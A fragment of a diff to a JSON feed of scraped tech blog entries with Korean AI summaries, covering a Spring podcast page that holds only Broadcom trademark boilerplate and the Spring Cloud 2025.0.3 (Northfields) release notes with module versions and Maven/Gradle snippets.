+    "aiSummary": "제공해주신 기사 본문은 기술적인 내용이나 특정 프로젝트에 관한 정보가 아니라 Broadcom 사의 저작권 정책 및 상표권 관련 고지 사항으로 구성되어 있습니다. 따라서 별도의 기사 핵심 내용을 요약할 정보가 포함되어 있지 않습니다.",
+    "cleanContent": "Copyright © 2005 - 2026 Broadcom. All Rights Reserved. The term \"Broadcom\" refers to Broadcom Inc. and/or its subsidiaries. Terms of Use • Privacy • Trademark Guidelines Apache®, Apache Tomcat®, Apache Kafka®, Apache Cassandra™, and Apache Geode™ are trademarks or registered trademarks of the Apache Software Foundation in the United States and/or other countries. Java™, Java™ SE, Java™ EE, and OpenJDK™ are trademarks of Oracle and/or its affiliates. Kubernetes® is a registered trademark of the Linux Foundation in the United States and other countries. Linux® is the registered trademark of Linus Torvalds in the United States and other countries. Windows® and Microsoft® Azure are registered trademarks of Microsoft Corporation. “AWS” and “Amazon Web Services” are trademarks or registered trademarks of Amazon.com Inc. or its affiliates. All other trademarks and copyrights are property of their respective owners and are only mentioned for informative purposes. Other names may be trademarks of their respective owners.",
+    "url": "https://spring.io/blog/2026/06/11/a-bootiful-podcast-rob-winch-answers-everything",
+    "category": "백엔드",
+    "source": "Spring Engineering",
+    "author": "joshlong",
+    "pubDate": "Thu, 11 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Spring",
+      "Java"
+    ]
+  },
+  {
+    "id": "https://spring.io/blog/2026/06/11/spring-cloud-2025-0-3-aka-northfields-has-been-released",
+    "title": "Spring Cloud 2025.0.3 (aka Northfields) Has Been Released",
+    "summary": "On behalf of the community, I am pleased to announce that the General Availability (RELEASE) of the Spring Cloud 2025.0.3 Release Train is available today. The release can be found in Maven Central. Y",
+    "aiSummary": "Spring Cloud 2025.0.3 버전인 Northfields가 정식 출시되었습니다. 이번 릴리스는 Spring Cloud 2025.0.x 라인의 마지막 오픈 소스 버전이며 2026년 6월 30일에 오픈 소스 지원이 종료될 예정입니다. 해당 버전은 Spring Boot 3.5.15를 기반으로 하며 Maven Central을 통해 배포됩니다.\n\n주요 변경 사항으로는 Spring Cloud Gateway에서의 CVE-2026-47825 취약점 해결을 포함하여 빈 경로 접두사 지원 추가와 MVC ProxyExchange의 URI 템플릿 관측 가능성 개선이 포함되었습니다.\n\n이번 업데이트에는 Spring Cloud Bus, Spring Cloud Openfeign, Spring Cloud Circuitbreaker, Spring Cloud Kubernetes, Spring Cloud Function 등 다수의 모듈이 포함되었습니다. 상세한 모듈별 버전 정보는 릴리스 노트를 통해 확인할 수 있으며 Maven 또는 Gradle을 통해 프로젝트 의존성에 반영할 수 있습니다.",
+    "cleanContent": "On behalf of the community, I am pleased to announce that the General Availability (RELEASE) of the Spring Cloud 2025.0.3 Release Train is available today. The release can be found in Maven Central. You can check out the 2025.0.3 release notes for more information.\nNotable Changes in the 2025.0.3 Release Train\nThis will be the final open source release of the Spring Cloud 2025.0.x release train.  Open source support for SPring Cloud 2025.0.x will end on June 30th, 2026.\nThis release is based on Spring Boot 3.5.15.\nSpring Cloud Gateway\n\nFix for CVE-2026-47825\nAdd support for empty path prefixes (#3201)\nMVC ProxyExchange provides observability of URI template (#3458)\n\nThe following modules were updated as part of 2025.0.3:\n\n\n\nModule\nVersion\nIssues\n\n\n\n\nSpring Cloud Bus\n4.3.2\n(issues)\n\n\nSpring Cloud Openfeign\n4.3.3\n(issues)\n\n\nSpring Cloud Circuitbreaker\n3.3.3\n(issues)\n\n\nSpring Cloud Kubernetes\n3.3.3\n(issues)\n\n\nSpring Cloud Function\n4.3.4\n(issues)\n\n\nSpring Cloud Task\n3.3.2\n(issues)\n\n\nSpring Cloud Stream\n4.3.3\n(issues)\n\n\nSpring Cloud Starter Build\n2025.0.3\n(issues)\n\n\nSpring Cloud Vault\n4.3.3\n(issues)\n\n\nSpring Cloud Commons\n4.3.3\n(issues)\n\n\nSpring Cloud Netflix\n4.3.3\n(issues)\n\n\nSpring Cloud Consul\n4.3.3\n(issues)\n\n\nSpring Cloud Gateway\n4.3.5\n(issues)\n\n\nSpring Cloud Zookeeper\n4.3.3\n(issues)\n\n\nSpring Cloud Config\n4.3.4\n(issues)\n\n\nSpring Cloud Build\n4.3.4\n(issues)\n\n\nSpring Cloud Contract\n4.3.4\n(issues)\n\n\n\nAs always, we welcome feedback on GitHub, on Gitter, on Stack Overflow, or on Twitter.\nTo get started with Maven with a BOM (dependency management only):\n\n<dependencyManagement>\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.cloud</groupId>\n            <artifactId>spring-cloud-dependencies</artifactId>\n            <version>2025.0.3</version>\n            <type>pom</type>\n            <scope>import</scope>\n        </dependency>\n    </dependencies>\n</dependencyManagement>\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-config</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>\n    </dependency>\n    ...\n</dependencies>\n\nor with Gradle:\nbuildscript {\ndependencies {\nclasspath \"io.spring.gradle:dependency-management-plugin:1.0.2.RELEASE\"\n}\n}\n\n\n\napply plugin: \"io.spring.dependency-management\"\n\ndependencyManagement {\nimports {\nmavenBom 'org.springframework.cloud:spring-cloud-dependencies:2025.0.3'\n}\n}\n\ndependencies {\ncompile 'org.springframework.cloud:spring-cloud-starter-config'\ncompile 'org.springframework.cloud:spring-cloud-starter-netflix-eureka-client'\n...\n}",
+    "url": "https://spring.io/blog/2026/06/11/spring-cloud-2025-0-3-aka-northfields-has-been-released",
+    "category": "백엔드",
+    "source": "Spring Releases",
+    "author": "ryanjbaxter",
+    "pubDate": "Thu, 11 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Spring",
+      "Java"
     ]
   }
 ]
